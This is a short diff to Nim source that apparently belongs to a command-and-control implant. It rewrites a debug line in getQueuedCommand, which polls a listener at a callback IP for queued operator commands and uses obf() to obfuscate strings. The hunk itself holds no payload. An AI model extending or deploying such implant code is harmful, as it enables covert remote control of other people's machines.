@@ -463,9 +463,15 @@ proc getQueuedCommand*(li : Listener) : (string, string, seq[string]) =
     when defined verbose:
         echo obf("DEBUG: getQueuedCommand() called for implant ID: ") & li.id
         echo obf("DEBUG: getQueuedCommand() request target: ") & li.taskPath
-        echo obf("DEBUG: getQueuedCommand() full URL will be: ") & toLowerAscii(li.listenerType) & "://" & 
-             (if li.listenerHost != "": li.listenerHost else: li.implantCallbackIp & ":" & li.listenerPort) & 
-             li.taskPath
+        # Build URL correctly (check if implantCallbackIp already has protocol)
+        var debugUrl = ""
+        if li.listenerHost != "":
+            debugUrl = toLowerAscii(li.listenerType) & "://" & li.listenerHost & li.taskPath
+        elif li.implantCallbackIp.startsWith("http://") or li.implantCallbackIp.startsWith("https://"):
+            debugUrl = li.implantCallbackIp & li.taskPath
+        else:
+            debugUrl = toLowerAscii(li.listenerType) & "://" & li.implantCallbackIp & ":" & li.listenerPort & li.taskPath
+        echo obf("DEBUG: getQueuedCommand() full URL will be: ") & debugUrl
     
     var 
         res = doRequest(li, li.taskPath)
